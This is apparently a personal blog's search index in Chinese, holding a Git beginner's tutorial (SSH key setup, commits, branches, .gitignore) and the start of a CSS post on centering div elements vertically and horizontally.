<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Git必知必会</title>
    <url>/2021/01/29/20210129-Git%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/</url>
    <content><![CDATA[<p>如果您不能很好的应用 Git，那么这里为您提供一个非常棒的 Git 在线练习工具 <a href="https://learngitbranching.js.org/?locale=zh_CN">Git Online</a>，您可以更直观的看到您所使用的命令会产生什么效果。</p>
<span id="more"></span>

<h2 id="1-入门"><a href="#1-入门" class="headerlink" title="1 入门"></a>1 入门</h2><p>git命令行操作跟Linux一样</p>
<h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h3><ol>
<li><p>Use git from git bash only…, 其他默认下一步</p>
</li>
<li><p>查看环境变量配置, 没有则手动配置, path: E:\programs\Git\bin</p>
</li>
<li><p>配置git, 桌面右键git bash…, 配置用户名和邮箱</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name hua</span><br><span class="line">git config --global user.email &quot;2827890646@qq.com&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>该配置文件在本地计算机c:\user\用户\.gitconfig</p>
<h3 id="1-2-git-status-git-commit等中文信息乱码问题"><a href="#1-2-git-status-git-commit等中文信息乱码问题" class="headerlink" title="1.2 git status, git commit等中文信息乱码问题"></a>1.2 git status, git commit等中文信息乱码问题</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global gui.encoding utf-8</span><br><span class="line">git config --global i18n.commitencoding utf-8</span><br><span class="line">git config --global core.quotepath false</span><br><span class="line">git config --global svn.pathnameecoding utf-8</span><br></pre></td></tr></table></figure>

<h3 id="1-3-本地git与远程github保持登录联通"><a href="#1-3-本地git与远程github保持登录联通" class="headerlink" title="1.3 本地git与远程github保持登录联通"></a>1.3 本地git与远程github保持登录联通</h3><p>git 的远程仓库托管网站目前就<a href="https://github.com/" title="github">github</a>一个常用</p>
<p>为了在本地和远程仓库之间进行操作, 可采取免密钥登录,配置 .ssh 先在本地配置, 然后把公钥发送给远程仓库github.</p>
<ol>
<li><p>在本地git命令行中输入:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C 2827890646@qq.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后一直回车, 出现下图则表示成功</p>
<p><img src="https://cdn.huatree.top/image-20230927165232917.jpg" alt="image-20230927165232917"></p>
</li>
<li><p>发送给远程github</p>
<ol>
<li><p>github -&gt; settings -&gt; SSH and … -&gt; New SSH -&gt; title &amp; key</p>
<p><img src="https://cdn.huatree.top/image-20230927165251266.jpg" alt="image-20230927165251266"></p>
</li>
<li><p>复制本地公钥到key中, 删掉最后的回车占位符</p>
</li>
<li><p>如果本地和远程成功通信, 则在本地.&#x2F;ssh目录中自动生成<strong>known-hosts</strong>文件</p>
</li>
<li><p>测试本地仓库与远程仓库的登录连通性, git命令行:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h3 id="1-4-本地创建git项目与远程项目进行关联"><a href="#1-4-本地创建git项目与远程项目进行关联" class="headerlink" title="1.4 本地创建git项目与远程项目进行关联"></a>1.4 本地创建git项目与远程项目进行关联</h3><p>本地创建git项目与远程项目进行关联时，要保持本地电脑PC端github账号登录状态。（一般是本地电脑，这个跟ssh配置有关。ssh配置指向其他地址，则其他地址上的github账号保持登录状态即可）[参考本地git与远程github保持登录联通](#1.3 本地git与远程github保持登录联通)</p>
<ol>
<li><p>先创建一个目录demo</p>
</li>
<li><p>进入该目录,鼠标右键点击git bash…, 打开git命令端, 输入 <code>git init</code>, 会自动在demo目录下生成 <strong>.git</strong>目录(该目录是隐藏的).</p>
</li>
<li><p>github上创建一个Repository.</p>
<p><img src="https://cdn.huatree.top/image-20230927165301540.jpg" alt="image-20230927165301540"></p>
</li>
<li><p>第一次发布项目(本地 -&gt; 远程)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git add . // 文件 -&gt; 暂存区, &quot;.&quot; 表示当前目录下的所有文件提交暂存区</span><br><span class="line">git commit -m &quot;第一次提交&quot;  // 暂存区 -&gt; 本地分支(默认为master)</span><br><span class="line">git remote add origin &lt;远程项目所在的ssh地址(或http协议地址)&gt;</span><br><span class="line">git push -u origin master // 本地分支 -&gt; 远程项目</span><br></pre></td></tr></table></figure>
</li>
<li><p>第一次下载项目(远程 -&gt; 本地)</p>
<p>本地创建一个目录, 进入该目录, 打开git命令终端, 输入下面命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@github.com:yanse/mygitdemo.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>非第一次提交(本地 -&gt; 远程)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;第二次提交&quot;</span><br><span class="line">git push origin master // 注意: 这里去掉了 -u (其实可以简写成git push)</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新(远程 -&gt; 本地)</p>
<ol>
<li><p>在远程项目中修改文件.</p>
<p><img src="https://cdn.huatree.top/image-20230927165310068.jpg" alt="image-20230927165310068"></p>
</li>
<li><p>本地项目中, git命令行输入 <code>git pull</code> 即可更新.</p>
</li>
</ol>
</li>
</ol>
<h2 id="2-进阶"><a href="#2-进阶" class="headerlink" title="2 进阶"></a>2 进阶</h2><h3 id="2-1-git优势"><a href="#2-1-git优势" class="headerlink" title="2.1 git优势"></a>2.1 git优势</h3><ol>
<li>本地版本控制；</li>
<li>重写提交说明</li>
<li>每次操作都可以回滚，还原；</li>
<li>分支系统，分布式。</li>
</ol>
<h3 id="2-2-git三种状态"><a href="#2-2-git三种状态" class="headerlink" title="2.2 git三种状态"></a>2.2 git三种状态</h3><ol>
<li>已修改（modified）</li>
<li>已暂存（staged）</li>
<li>已提交（committed）</li>
</ol>
<h3 id="2-3-设置用户和邮箱"><a href="#2-3-设置用户和邮箱" class="headerlink" title="2.3 设置用户和邮箱"></a>2.3 设置用户和邮箱</h3><p>Git 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。这些变量存储再三个不同的位置：</p>
<ol>
<li><strong>&#x2F;etc&#x2F;gitconfig</strong> 文件：包含系统上每一个用户及他们仓库的通用配置。如果在执行 git config 时带上 <strong>–system</strong> 选项，那么它就会读写该文件中的配置变量。（由于它是系统配置文件，因此您需要管理员吧或超级用户权限来修改它。）</li>
<li><strong>~&#x2F;.gitconfig 或 ~&#x2F;.config&#x2F;git&#x2F;config</strong> 文件：只针对当前用户。您可以传递 <strong>–global</strong> 选项让 Git 读写此文件，这会对您的系统上所有的仓库生效。</li>
<li>当前使用仓库的 Git 目录中的 config 文件（即 <strong>.git&#x2F;config</strong>）：针对该仓库。您可以传递 <strong>–local</strong> 选项让 Git 强制读写此文件，虽然默认情况下的就是它。（当然，您需要进入某个 Git 仓库中才能让该选项生效。）</li>
</ol>
<p>每一个级别会覆盖上一个级别的配置，所以，**.git&#x2F;config** 的配置变量会覆盖 <strong>&#x2F;etc&#x2F;gitconfig</strong> 中的配置变量。</p>
<h3 id="2-4-将某个目录纳入-git-管理"><a href="#2-4-将某个目录纳入-git-管理" class="headerlink" title="2.4 将某个目录纳入 git 管理"></a>2.4 将某个目录纳入 git 管理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init // 此时，git 命令行中显示master，项目目录下自动生成 .git 文件夹。（.git：负责版本控制的目录）</span><br><span class="line">git rm --cached &lt;file&gt; // 暂存区 -&gt; 工作区</span><br><span class="line">git commit // 进入 vi 操作界面，写提交的备注，适合较长的备注（简写：git commit -m &quot;备注内容&quot;）</span><br></pre></td></tr></table></figure>

<p>已提交到对象区（分支区），然后修改该已提交的文件，此时，这个文件会退回到工作区；如果还想提交的话，再经历一次操作：工作区 - &gt; 暂存区 -&gt; 对象区（分支区）；如果想撤销修改，可执行git命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-5-git-log"><a href="#2-5-git-log" class="headerlink" title="2.5 git log"></a>2.5 git log</h3><ol>
<li><p>查看提交日志，会发现如下内容：</p>
<p><img src="https://cdn.huatree.top/image-20230927165319670.jpg" alt="image-20230927165319670"></p>
<p>commit 后面的那一串字符：<strong>sha1</strong> 计算的结果。</p>
<p>sha1、md5：加密算法、随机数，用于区分是哪一次提交。</p>
</li>
<li><p>自定义查看日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log -2 // 2：指最近的2次提交</span><br><span class="line">git log --pretty=online</span><br><span class="line">git log --pretty=format:&quot;%h -%an, %ar : %s&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-6-删除用户配置信息"><a href="#2-6-删除用户配置信息" class="headerlink" title="2.6 删除用户配置信息"></a>2.6 删除用户配置信息</h3><ol>
<li><p>找到 .gitconfig 文件直接删掉（最直接）</p>
</li>
<li><p>或通过命令删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global(或 --system 或 --local) --unset user.name</span><br><span class="line">git config --global(或 --system 或 --local) --unset user.email</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-7-已提交的文件-修改后-撤销回滚"><a href="#2-7-已提交的文件-修改后-撤销回滚" class="headerlink" title="2.7 已提交的文件-修改后-撤销回滚"></a>2.7 已提交的文件-修改后-撤销回滚</h3><p><img src="https://cdn.huatree.top/image-20230927165331246.jpg" alt="image-20230927165331246"></p>
<p>如果某个文件，已提交，并对其进行了修改，可以放弃修改（还原到已提交状态）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-8-工作区文件-gt-暂存区后：撤销-add-操作"><a href="#2-8-工作区文件-gt-暂存区后：撤销-add-操作" class="headerlink" title="2.8 工作区文件 -&gt; 暂存区后：撤销 add 操作"></a>2.8 工作区文件 -&gt; 暂存区后：撤销 add 操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt;</span><br></pre></td></tr></table></figure>

<p>小结</p>
<p><img src="https://cdn.huatree.top/image-20230927165341838.jpg" alt="image-20230927165341838"></p>
<h3 id="2-9-提交问题与用户邮箱配置"><a href="#2-9-提交问题与用户邮箱配置" class="headerlink" title="2.9 提交问题与用户邮箱配置"></a>2.9 提交问题与用户邮箱配置</h3><p>场景：第一个邮箱用户git提交了文件，第二个邮箱用户（把第一个邮箱用户改成第二个的）在同一个本地环境（跟第一个用户环境保持一致，就用第一个的项目，说白了就是改了个邮箱用户名而已，其他都没变）的项目中进行git提交操作（如新建了一个文件，修改了文件后提交到对象区）。此时，git log查看到，之前的配置没变，记录此次的配置。</p>
<p><img src="https://cdn.huatree.top/image-20230927165349980.jpg" alt="image-20230927165349980"></p>
<h3 id="2-10-删除已提交到对象区（即分支区）的文件"><a href="#2-10-删除已提交到对象区（即分支区）的文件" class="headerlink" title="2.10 删除已提交到对象区（即分支区）的文件"></a>2.10 删除已提交到对象区（即分支区）的文件</h3><ol>
<li><p>git rm 操作删除：删除 -&gt; 在暂存区</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git rm &lt;file&gt;</span><br></pre></td></tr></table></figure>

<p>删除之后的文件会被放到暂存区，如果想彻底删除，在输入 git 命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;彻底删除&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>操作系统删除 rm ：删除 -&gt; 工作区</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm &lt;file&gt;</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;彻底删除&quot;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-11-撤销已提交文件的删除"><a href="#2-11-撤销已提交文件的删除" class="headerlink" title="2.11 撤销已提交文件的删除"></a>2.11 撤销已提交文件的删除</h3><ol>
<li>对象区（分支区）- <code>git rm &lt; file &gt;</code> -&gt;</li>
<li>暂存区 - <code>git reset HEAD &lt; file &gt;</code> -&gt; (注意：这里抛出了delete信息)</li>
<li>工作区 - <code>git checkout -- &lt; file &gt;</code></li>
</ol>
<h3 id="2-12-重命名文件"><a href="#2-12-重命名文件" class="headerlink" title="2.12 重命名文件"></a>2.12 重命名文件</h3><ol>
<li><p>git命令的文件重命名</p>
<p>git 文件的重命名的内部执行流程：首先新建一个文件，把源文件内容拷贝进去，然后再删掉源文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git mv &lt;file1&gt; &lt;file2&gt;</span><br><span class="line">git status // renamed: &lt;file1&gt; -&gt; &lt;file2&gt;</span><br><span class="line">git reset HEAD &lt;file1&gt; // new file: &lt;file2&gt;, deleted: &lt;file1&gt;</span><br><span class="line">git checkout -- &lt;file1&gt;</span><br><span class="line">ls // &lt;file1&gt;、&lt;file2&gt;都在</span><br><span class="line">git status // new file: &lt;file2&gt;，可提交 -&gt; 对象区， 也可撤销 -&gt; 工作区</span><br></pre></td></tr></table></figure>
</li>
<li><p>操作系统命令的文件重命名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv &lt;file1&gt; &lt;file2&gt;</span><br><span class="line">git status // deleted: &lt;file1&gt;, untracked files: &lt;file2&gt;</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;操作系统命令的重命名&quot;</span><br><span class="line">git status // 每次操作可以用此命令查看文件的状态，定位文件所在哪个区，需执行的可操作提示</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="2-13-注释重写提交说明"><a href="#2-13-注释重写提交说明" class="headerlink" title="2.13 注释重写提交说明"></a>2.13 注释重写提交说明</h3><p><strong>git log</strong> &#x2F;&#x2F; 出现冒号，按 q 退出模式</p>
<p><img src="https://cdn.huatree.top/image-20230927165358667.jpg" alt="image-20230927165358667"></p>
<p>修改最近一次提交的备注信息：<code>git commit --amend -m &quot;备注内容&quot;</code></p>
<p><img src="https://cdn.huatree.top/image-20230927165407304.jpg" alt="image-20230927165407304"></p>
<h3 id="2-14-忽略文件：-gitignore"><a href="#2-14-忽略文件：-gitignore" class="headerlink" title="2.14 忽略文件：.gitignore"></a>2.14 忽略文件：.gitignore</h3><p>git 项目中，提交前，先忽略不需要提交的文件，再把剩下的提交到对象区（分支区）。</p>
<p>在 git 项目根目录下创建 <strong>.gitignore</strong> 文件，编辑内容 <code>vi .gitignore</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a.properties // 列出忽略提交的文件即可</span><br></pre></td></tr></table></figure>

<p>保存该 <strong>.gitignore</strong> 文件，接着，退出 vi 编辑模式，返回 git 命令行，输入 git status</p>
<p>查看文件状态，该项目列表中已经没有了 a.properties 文件，它被忽略了。</p>
<h3 id="2-15-通配符"><a href="#2-15-通配符" class="headerlink" title="2.15 通配符"></a>2.15 通配符</h3><p>使用场景：如 <strong>.gitignore</strong> 文件编写需要排除的文件。以下是常见的通配符：</p>
<ol>
<li>*：匹配任意字符。</li>
<li>*.xxx：匹配后缀 .xxx 的文件中。</li>
<li>!<a href="http://xx.xxx/" title="xx.xxx">xx.xxx</a>：在后缀 .xxx 的文件中，排除 <a href="http://xx.xxx/" title="xx.xxx">xx.xxx</a> 文件，结合 *.xxx 使用。</li>
<li>dir(目录)&#x2F; ：忽略 dir 中的所有文件。</li>
<li>dir(目录)&#x2F;<em>&#x2F;</em>.xxx：能够忽略如 dir&#x2F;t1&#x2F;a.xxx, dir&#x2F;t2&#x2F;b.xxx，但不能忽略含2级以上的目录中的 *.xxx文件（如：dir&#x2F;a&#x2F;b&#x2F;j.xxx），这跟通配符 &lt;*&gt; 有关。</li>
<li>dir&#x2F;**&#x2F;*.xxx：忽略任意级别目录中的 *.xxx文件。</li>
<li>git 项目中创建的<strong>空目录</strong>，默认自动忽略，git status 查不到此目录信息。</li>
</ol>
<h3 id="2-16-分支"><a href="#2-16-分支" class="headerlink" title="2.16 分支"></a>2.16 分支</h3><ol>
<li><p>查看分支：<code>git branch</code></p>
</li>
<li><p>创建分支：<code>git branch &lt;分支名&gt;</code></p>
</li>
<li><p>切换分支：<code>git checkout &lt;分支名&gt;</code></p>
</li>
<li><p>删除分支：<code>git branch -d &lt;分支名&gt;</code></p>
<ol>
<li><p>自己不能删除自己（当前分支），可切换主分支master，再删除当前分支。</p>
</li>
<li><p>如果要被删除的分支，包含“未合并”的内容，切换到master进行删除会报错。建议先合并再通过master删除。</p>
<p><img src="https://cdn.huatree.top/image-20230927165414857.jpg" alt="image-20230927165414857"></p>
</li>
</ol>
</li>
<li><p>创建新分支并切换到该分支：<code>git checkout -b &lt;分知名&gt;</code>，结合 <strong>4.</strong> 进行操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 场景：git项目已存在文件</span><br><span class="line">git checkout -b new_branch</span><br><span class="line">git rm *.xxx // 删除 *.xxx 文件</span><br><span class="line">git commit -m &quot;delete files: *.xxx&quot; // 在 new_branch 分支中没有了 *.xxx文件</span><br><span class="line">git checkout master // 分支new_branch 删除的 *.xxx 文件在主分支 master 中仍存在，此时没有受到 new_branch 操作影响，注意这里，已经切换到了 master</span><br><span class="line">git branch -d new_branch // 报错，没删掉 new_branch 分支，并且提示 new_branch 需要合并（merge）到master，才能通过master删掉 new_branch。</span><br><span class="line">git merge new_branch // new_branch 合并到 master，注意观察 new_branch 之前删除的 *.xxx在 master 中没有了。</span><br><span class="line">git branch -d new_branch // 成功删除分支 new_branch</span><br></pre></td></tr></table></figure>

<p><strong>Tips</strong></p>
<p>强行删除分支：<code>git branch -D &lt;分支名&gt;</code></p>
</li>
<li><p>查看分支最近提交（commit）的 <strong>sha1</strong>值：<code>git branch -v</code></p>
<p><strong>细节问题</strong></p>
<ol>
<li>如果在非主分支中，file1 文件进行了写操作（即增删改），但此操作局限在工作区中进行（没有add、commit）。在 master 中能够看到该操作。</li>
<li>如果在非主分支中，file1 文件进行了写操作（即增删改），并且add，commit。在 master 中无法观察改操作，看不到 file1 文件。（问点：非主分支主动合并 master，或主分支 master 合并非主分支，观察 file1 状态）</li>
<li>如果在非主分支中， file1 文件进行了写操作（即增删改），但此操作局限在工作区中进行（没有add，commit）。在 master 中删除该非主分支，可直接删除。</li>
<li>如果在非主分支中，file1 文件进行了写操作（即增删改），并且add，commit。在 master 中无法删除该非主分支。</li>
</ol>
</li>
</ol>
<h3 id="2-17-分支-提交链（分支合并与冲突）"><a href="#2-17-分支-提交链（分支合并与冲突）" class="headerlink" title="2.17 分支-提交链（分支合并与冲突）"></a>2.17 分支-提交链（分支合并与冲突）</h3><p><img src="https://cdn.huatree.top/image-20230927165421894.jpg" alt="image-20230927165421894"></p>
<p>分支名（master）：指向当前的提交（commit）</p>
<p>HEAD：指向当前分支（HEAD -&gt; 分支名）</p>
<p><img src="https://cdn.huatree.top/image-20230927165441537.jpg" alt="image-20230927165441537"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 场景：git 空项目，分支合并</span><br><span class="line">git init</span><br><span class="line">git checkout -b dev // 当前分支 dev，指向：HEAD -&gt; dev</span><br><span class="line">cd .git</span><br><span class="line">ls // HEAD位置：.git -&gt; HEAD</span><br><span class="line">cat HEAD // ref：refs/heads/dev</span><br><span class="line">cd ..</span><br><span class="line">cd ..</span><br><span class="line">git log // 查看 sha1 值 HEAD -&gt; dev，master</span><br><span class="line">vi a.txt //编辑内容：a，保存，退出 vi 模式，返回 git 命令</span><br><span class="line">git add .</span><br><span class="line">git commit -m “dev1”</span><br><span class="line">git log // 观察 dev 的 sha1 值 -&gt; dev1，此时，分支 dev 领先 master 一步</span><br><span class="line">vi a.txt // 修改内容</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;dev2&quot;</span><br><span class="line">git log // 观察 dev 的 sha1 值 -&gt; dev2，此时，分支 dev 已经领先 master 两步了</span><br><span class="line">.....未完待续</span><br></pre></td></tr></table></figure>

<h2 id="3-常见错误"><a href="#3-常见错误" class="headerlink" title="3 常见错误"></a>3 常见错误</h2><h3 id="3-1-ssh-connect-to-host-github-com-port-22-Connection-timed-out"><a href="#3-1-ssh-connect-to-host-github-com-port-22-Connection-timed-out" class="headerlink" title="3.1 ssh: connect to host github.com port 22: Connection timed out"></a>3.1 ssh: connect to host <a href="http://github.com/" title="github.com">github.com</a> port 22: Connection timed out</h3><p>解决方法:</p>
<p>打开目录.ssh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>查看是否存在 id_rsa   id_rsa.pun  known_hosts 三个文件, 如果没有则参考ssh本地关联远程github</p>
<ol>
<li><p>vi config(进入vi编辑界面)</p>
</li>
<li><p>insert模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User YourEmail@qq.com</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">port 433</span><br></pre></td></tr></table></figure></li>
</ol>
<p>其中,YourEmail为申请github账号所绑定的邮箱.</p>
<p>保存之后再次执行”ssh -T <a href="mailto:git@github.com" title="git@github.com">git@github.com</a>“时, 会出现如下提示, 一路回车”yes”即可.</p>
<h2 id="4-日常技能"><a href="#4-日常技能" class="headerlink" title="4 日常技能"></a>4 日常技能</h2><h3 id="4-1-git-add-后的删除暂存区"><a href="#4-1-git-add-后的删除暂存区" class="headerlink" title="4.1 git add . 后的删除暂存区"></a>4.1 git add . 后的删除暂存区</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">rm</span> -r -f --cached .</span><br></pre></td></tr></table></figure>

<h3 id="4-2-git的分支推送设置dev默认项"><a href="#4-2-git的分支推送设置dev默认项" class="headerlink" title="4.2 git的分支推送设置dev默认项"></a>4.2 git的分支推送设置dev默认项</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push --set-upstream origin dev</span><br></pre></td></tr></table></figure>

<h3 id="4-3-git中的CRLF和LF"><a href="#4-3-git中的CRLF和LF" class="headerlink" title="4.3  git中的CRLF和LF"></a>4.3  git中的CRLF和LF</h3><blockquote>
<p>说明：参考官方文档，有详细叙述（切记网上瞎搜索，浪费时间，还不一定是对的）</p>
</blockquote>
<h3 id="4-4-GitHub-Desktop工具"><a href="#4-4-GitHub-Desktop工具" class="headerlink" title="4.4 GitHub Desktop工具"></a>4.4 GitHub Desktop工具</h3><p>可解决分支删不掉的问题</p>
<h3 id="4-5-查看分支合并图"><a href="#4-5-查看分支合并图" class="headerlink" title="4.5 查看分支合并图"></a>4.5 查看分支合并图</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> --oneline --graph --decorate --all</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>div元素垂直水平居中</title>
    <url>/2021/04/13/20210413-div%E5%85%83%E7%B4%A0%E5%9E%82%E7%9B%B4%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220509055101090.png" alt="image-20220509055101090"></p>
<span id="more"></span>

<h2 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h2><h3 id="line-hight"><a href="#line-hight" class="headerlink" title="line-hight"></a>line-hight</h3><p>适用：单行文本垂直居中</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    line-hight: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Text<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>垂直居中一张图片</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    line-hight: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">vertical-align</span>: middle;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span> <span class="attr">src</span>=<span class="string">&quot;image.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><p>适用：通用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: table;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: table-cell;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">vertical-align</span>: middle;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="comment">/* 低版本IE fix bug */</span></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绝对定位和负外边距"><a href="#绝对定位和负外边距" class="headerlink" title="绝对定位和负外边距"></a>绝对定位和负外边距</h3><p>适用：块级元素</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.parent</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.child</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">top</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-top</span>: -<span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;parent&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;child&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="绝对定位和垂直拉伸"><a href="#绝对定位和垂直拉伸" class="headerlink" title="绝对定位和垂直拉伸"></a>绝对定位和垂直拉伸</h3><p>适用：通用，但<code>IE&lt;7</code>版本时不能正常渲染</p>
